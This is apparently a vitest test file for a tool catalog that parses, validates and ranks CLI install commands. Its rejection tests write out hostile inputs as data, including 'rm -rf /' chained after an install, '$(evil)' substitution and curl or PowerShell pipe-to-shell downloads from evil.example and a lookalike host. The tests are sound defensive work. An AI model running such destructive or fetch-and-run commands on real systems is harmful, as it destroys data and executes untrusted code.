import { describe, expect, it } from 'vitest';
import type { CliCatalogEntry, CliInstallOption } from '@hypergate/shared';
import {
  CLI_MANAGERS,
  chooseInstall,
  enrichCliInstalls,
  lifecycleFor,
  managerOf,
  parseCuratedCommand,
  parseCuratedScript,
  parseScriptShape,
  rankInstall,
} from './cli-actions.js';
import { CURATED_SCRIPT_COMMANDS, KNOWN_CLIS, cliCatalogEntry, knownCli } from './clis.js';

const entry = (over: Partial<CliCatalogEntry>): CliCatalogEntry => ({
  id: 'x',
  name: 'X',
  command: 'x',
  description: '',
  category: 'other',
  channel: 'npm',
  ...over,
});

describe('parseCuratedCommand', () => {
  // The same cases the shell's parse_curated_install asserts, so the two
  // runners cannot drift apart about what is executable.
  it('accepts plain launcher commands as argv', () => {
    expect(parseCuratedCommand('npm install -g vercel')).toEqual(['npm', 'install', '-g', 'vercel']);
    expect(parseCuratedCommand('  brew install gh  ')).toEqual(['brew', 'install', 'gh']);
    expect(parseCuratedCommand('winget install GitHub.cli')).toEqual(['winget', 'install', 'GitHub.cli']);
    expect(parseCuratedCommand('uv tool install ruff')).toEqual(['uv', 'tool', 'install', 'ruff']);
  });

  it('rejects URLs, shell metacharacters, and unknown launchers', () => {
    expect(parseCuratedCommand('https://bun.sh')).toBeNull();
    expect(parseCuratedCommand('curl -fsSL https://bun.sh/install | bash')).toBeNull();
    expect(parseCuratedCommand('powershell -c "irm bun.sh/install.ps1 | iex"')).toBeNull();
    expect(parseCuratedCommand('npm install -g x && rm -rf /')).toBeNull();
    expect(parseCuratedCommand('npm install $(evil)')).toBeNull();
    expect(parseCuratedCommand('rustup default stable')).toBeNull();
    expect(parseCuratedCommand('')).toBeNull();
    expect(parseCuratedCommand('npm install https://evil.example/pkg.tgz')).toBeNull();
  });
});

describe('lifecycleFor', () => {
  it('derives the mechanical inverse per manager', () => {
    expect(lifecycleFor({ label: 'npm', command: 'npm install -g @playwright/cli@latest' }).uninstall).toBe(
      'npm uninstall -g @playwright/cli',
    );
    expect(lifecycleFor({ label: 'Homebrew', command: 'brew install supabase/tap/supabase' })).toEqual({
      uninstall: 'brew uninstall supabase/tap/supabase',
      repair: 'brew reinstall supabase/tap/supabase',
    });
    expect(lifecycleFor({ label: 'winget', command: 'winget install GitHub.cli' }).uninstall).toBe('winget uninstall GitHub.cli');
    expect(lifecycleFor({ label: 'Scoop', command: 'scoop install gh' }).uninstall).toBe('scoop uninstall gh');
    expect(lifecycleFor({ label: 'yarn', command: 'yarn global add vercel' }).uninstall).toBe('yarn global remove vercel');
  });

  it('gives scripts and download pages no lifecycle commands', () => {
    expect(lifecycleFor({ label: 'shell', command: 'curl -fsSL https://bun.sh/install | bash' })).toEqual({});
    expect(lifecycleFor({ label: 'download', command: 'https://nodejs.org' })).toEqual({});
  });
});

describe('enrichCliInstalls', () => {
  it('annotates managers and extends an npm route to pnpm/yarn/bun', () => {
    const enriched = enrichCliInstalls(entry({ installs: [{ label: 'npm', command: 'npm install -g vercel@latest' }] }));
    const managers = enriched.installs!.map((o) => o.manager);
    expect(managers).toEqual(['npm', 'pnpm', 'yarn', 'bun']);
    expect(enriched.installs![1].command).toBe('pnpm add -g vercel@latest');
    expect(enriched.installs![1].uninstall).toBe('pnpm remove -g vercel');
  });

  it('never duplicates a manager the entry already lists, and is idempotent', () => {
    const one = enrichCliInstalls(
      entry({
        installs: [
          { label: 'npm', command: 'npm install -g wrangler' },
          { label: 'pnpm', command: 'pnpm add -g wrangler' },
        ],
      }),
    );
    expect(one.installs!.filter((o) => o.manager === 'pnpm')).toHaveLength(1);
    const twice = enrichCliInstalls(one);
    expect(twice.installs!.map((o) => o.command)).toEqual(one.installs!.map((o) => o.command));
  });

  it('leaves script-only entries alone', () => {
    const scriptOnly = entry({ installs: [{ label: 'shell', command: 'curl -L https://fly.io/install.sh | sh' }] });
    const enriched = enrichCliInstalls(scriptOnly);
    expect(enriched.installs).toHaveLength(1);
    expect(enriched.installs![0].uninstall).toBeUndefined();
  });
});

describe('chooseInstall', () => {
  const e = enrichCliInstalls(
    entry({
      installs: [
        { label: 'shell', command: 'curl -L https://fly.io/install.sh | sh' },
        { label: 'Homebrew', command: 'brew install flyctl' },
      ],
    }),
  );

  it('honors the requested manager and skips unrunnable routes otherwise', () => {
    expect(chooseInstall(e, 'brew')?.command).toBe('brew install flyctl');
    expect(chooseInstall(e)?.command).toBe('brew install flyctl');
    expect(chooseInstall(e, 'npm')).toBeUndefined();
  });
});

describe('curated catalog integrity (lifecycle view)', () => {
  it('every runnable curated route parses and carries a manager Hypergate knows', () => {
    const managerIds = new Set(CLI_MANAGERS.map((m) => m.id));
    for (const tool of KNOWN_CLIS) {
      const enriched = enrichCliInstalls(cliCatalogEntry(tool));
      for (const option of enriched.installs ?? []) {
        const argv = parseCuratedCommand(option.command);
        if (!argv) continue; // scripts and download pages are copy-only by design
        expect(option.manager, `${tool.id}: ${option.command}`).toBeDefined();
        expect(managerIds.has(option.manager!), `${tool.id}: unknown manager ${option.manager}`).toBe(true);
        if (option.uninstall) {
          expect(parseCuratedCommand(option.uninstall), `${tool.id}: ${option.uninstall}`).not.toBeNull();
        }
        if (option.repair) {
          expect(parseCuratedCommand(option.repair), `${tool.id}: ${option.repair}`).not.toBeNull();
        }
      }
    }
  });

  it('auth hints are plain single commands, and only browser-flow ones are runnable', () => {
    const withAuth = KNOWN_CLIS.filter((t) => t.auth);
    expect(withAuth.length).toBeGreaterThanOrEqual(8);
    for (const tool of withAuth) {
      expect(tool.auth!.command).toMatch(/^[a-z][a-z0-9-]*( [a-z0-9-]+)*$/i);
      expect(tool.auth!.command.startsWith(tool.command), `${tool.id} auth uses its own binary`).toBe(true);
      if (!tool.auth!.runnable) {
        expect(tool.auth!.note, `${tool.id}: a copy-only auth command says why`).toBeDefined();
      }
    }
    expect(KNOWN_CLIS.find((t) => t.id === 'flyctl')?.auth?.runnable).toBe(true);
    expect(KNOWN_CLIS.find((t) => t.id === 'gh')?.auth?.runnable).toBeUndefined();
  });

  it('managerOf reads the manager from command, label, or explicit field', () => {
    expect(managerOf({ label: 'Homebrew', command: 'brew install gh' })).toBe('brew');
    expect(managerOf({ label: 'Chocolatey', command: 'choco install foo' })).toBe('choco');
    expect(managerOf({ label: 'download', command: 'https://nodejs.org' })).toBeUndefined();
    expect(managerOf({ label: 'anything', command: 'x', manager: 'npm' })).toBe('npm');
  });
});

describe('parseScriptShape', () => {
  it('accepts the vendor script forms the catalog actually ships', () => {
    expect(parseScriptShape('curl -fsSL https://claude.ai/install.sh | bash')).toEqual({
      shell: 'posix',
      requires: 'curl',
      url: 'https://claude.ai/install.sh',
    });
    expect(parseScriptShape('curl -LsSf https://astral.sh/uv/install.sh | sh')?.requires).toBe('curl');
    expect(parseScriptShape('wget -qO- https://bun.sh/install | bash')?.requires).toBe('wget');
    expect(parseScriptShape('powershell -c "irm https://bun.sh/install.ps1 | iex"')).toEqual({
      shell: 'powershell',
      requires: 'powershell',
      url: 'https://bun.sh/install.ps1',
    });
    expect(parseScriptShape('powershell -ExecutionPolicy ByPass -c "irm https://astral.sh/uv/install.ps1 | iex"')?.shell).toBe(
      'powershell',
    );
  });

  it('rejects anything outside the grammar', () => {
    // Chained or substituted commands: the whole reason the argv runner exists.
    expect(parseScriptShape('curl -fsSL https://bun.sh/install | bash && rm -rf /')).toBeNull();
    expect(parseScriptShape('curl -fsSL https://bun.sh/install | bash; evil')).toBeNull();
    expect(parseScriptShape('curl -fsSL $(evil) | bash')).toBeNull();
    expect(parseScriptShape('curl -fsSL https://bun.sh/install | bash `evil`')).toBeNull();
    // A fetcher we do not run, and a sink that is not a shell.
    expect(parseScriptShape('wibble -fsSL https://bun.sh/install | bash')).toBeNull();
    expect(parseScriptShape('curl -fsSL https://bun.sh/install | python')).toBeNull();
    // Plain http, and a redirect through a host nobody vouched for.
    expect(parseScriptShape('curl -fsSL http://bun.sh/install | bash')).toBeNull();
    expect(parseScriptShape('curl -fsSL https://evil.example/install.sh | bash')).toBeNull();
    expect(parseScriptShape('powershell -c "irm https://evil.example/x.ps1 | iex"')).toBeNull();
    // A lookalike host: the allowlist is exact, never a suffix match.
    expect(parseScriptShape('curl -fsSL https://bun.sh.evil.example/install | bash')).toBeNull();
    expect(parseScriptShape('curl -fsSL https://notbun.sh/install | bash')).toBeNull();
    expect(parseScriptShape('')).toBeNull();
  });
});

describe('parseCuratedScript', () => {
  it('runs only strings that are byte-identical to a curated route', () => {
    expect(parseCuratedScript('curl -fsSL https://claude.ai/install.sh | bash')?.shell).toBe('posix');
    // Grammatically fine and on an allowlisted host, but not a command we ship:
    // a lookup or a request body can never reach the shell this way.
    expect(parseCuratedScript('curl -fsSL https://claude.ai/install.sh | sh')).toBeNull();
    expect(parseCuratedScript('curl -fsSL https://bun.sh/other.sh | bash')).toBeNull();
    expect(parseCuratedScript('curl -fsSL  https://claude.ai/install.sh | bash')).toBeNull();
  });

  it('holds every curated script route to the grammar', () => {
    // Whatever is in the allowlist must also parse: a curated command that
    // cannot be validated would be executed on trust alone.
    for (const command of CURATED_SCRIPT_COMMANDS) {
      expect(parseScriptShape(command), command).not.toBeNull();
    }
    expect(CURATED_SCRIPT_COMMANDS.size).toBeGreaterThanOrEqual(5);
  });
});

describe('rankInstall', () => {
  const opt = (over: Partial<CliInstallOption>): CliInstallOption => ({ label: 'x', command: 'x', ...over });

  it('puts a present system manager first and an absent language manager last', () => {
    const ranks = [
      opt({ manager: 'brew', runner: 'argv', available: true }),
      opt({ manager: 'script', runner: 'script', available: true }),
      opt({ manager: 'npm', runner: 'argv', available: true }),
      opt({ manager: 'brew', runner: 'argv', available: false }),
      opt({ manager: 'script', runner: 'script', available: false }),
      opt({ manager: 'npm', runner: 'argv', available: false }),
      opt({ label: 'download', command: 'https://nodejs.org' }),
    ].map(rankInstall);
    expect(ranks).toEqual([0, 1, 2, 3, 4, 5, 6]);
  });

  it('treats an unprobed route as present, so an unknown answer never demotes it', () => {
    expect(rankInstall(opt({ manager: 'brew', runner: 'argv' }))).toBe(0);
    expect(rankInstall(opt({ manager: 'npm', runner: 'argv' }))).toBe(2);
  });
});

describe('install ordering (the system-manager-first rule)', () => {
  it('prefers Homebrew over npm for a tool that documents both', () => {
    const claude = enrichCliInstalls(cliCatalogEntry(knownCli('claude')!, 'darwin'));
    const order = claude.installs!.map((o) => o.manager);
    expect(order[0]).toBe('brew');
    expect(order.indexOf('brew')).toBeLessThan(order.indexOf('script'));
    expect(order.indexOf('script')).toBeLessThan(order.indexOf('npm'));
    expect(chooseInstall(claude)?.command).toBe('brew install --cask claude-code');
  });

  it('prefers winget over npm on Windows, where there is no brew', () => {
    const claude = enrichCliInstalls(cliCatalogEntry(knownCli('claude')!, 'win32'));
    expect(chooseInstall(claude)?.command).toBe('winget install Anthropic.ClaudeCode');
    expect(claude.installs!.some((o) => o.manager === 'brew')).toBe(false);
  });

  it('offers Homebrew for the runtimes whose vendors document it', () => {
    // Deno and Bun each document a `brew` route beside their install script, so
    // a Mac with Homebrew gets the managed route rather than a `curl | sh` that
    // Hypergate can neither upgrade nor remove afterwards.
    const deno = enrichCliInstalls(cliCatalogEntry(knownCli('deno')!, 'darwin'));
    expect(chooseInstall(deno)?.command).toBe('brew install deno');
    expect(deno.installs!.map((o) => o.manager)).toEqual(['brew', 'script', undefined]);

    // Bun's docs name their own tap, so the route carries the tap path and the
    // derived uninstall names it too.
    const bun = enrichCliInstalls(cliCatalogEntry(knownCli('bun')!, 'darwin'));
    expect(chooseInstall(bun)?.command).toBe('brew install oven-sh/bun/bun');
    expect(bun.installs![0].uninstall).toBe('brew uninstall oven-sh/bun/bun');
  });

  it('leaves a tool on npm when Homebrew packages it but the vendor does not', () => {
    // wrangler and vercel both have homebrew-core formulae, but neither vendor
    // documents one. Curated routes come from the vendor's own install docs, so
    // npm stays the route here rather than a repackaging nobody vouched for.
    for (const id of ['wrangler', 'vercel']) {
      const tool = enrichCliInstalls(cliCatalogEntry(knownCli(id)!, 'darwin'));
      expect(tool.installs!.some((o) => o.manager === 'brew')).toBe(false);
      expect(chooseInstall(tool)?.manager).toBe('npm');
    }
  });

  it('falls back to npm when no system manager is on this machine', () => {
    const claude = enrichCliInstalls(cliCatalogEntry(knownCli('claude')!, 'darwin'));
    const bare = {
      ...claude,
      installs: claude.installs!.map((o) => ({ ...o, available: o.manager === 'npm' })),
    };
    expect(chooseInstall(enrichCliInstalls(bare))?.manager).toBe('npm');
  });

  it('leaves an npm-only tool on npm, since no vendor route exists to prefer', () => {
    for (const id of ['wrangler', 'vercel', 'playwright-cli']) {
      const e = enrichCliInstalls(cliCatalogEntry(knownCli(id)!, 'darwin'));
      expect(chooseInstall(e)?.manager, id).toBe('npm');
    }
  });
});

describe('lifecycleFor casks', () => {
  it('keeps --cask on the reverse command, so it names the same thing it installed', () => {
    expect(lifecycleFor({ label: 'Homebrew', command: 'brew install --cask claude-code' })).toEqual({
      uninstall: 'brew uninstall --cask claude-code',
      repair: 'brew reinstall --cask claude-code',
    });
    expect(lifecycleFor({ label: 'Homebrew', command: 'brew install gh' }).uninstall).toBe('brew uninstall gh');
  });
});
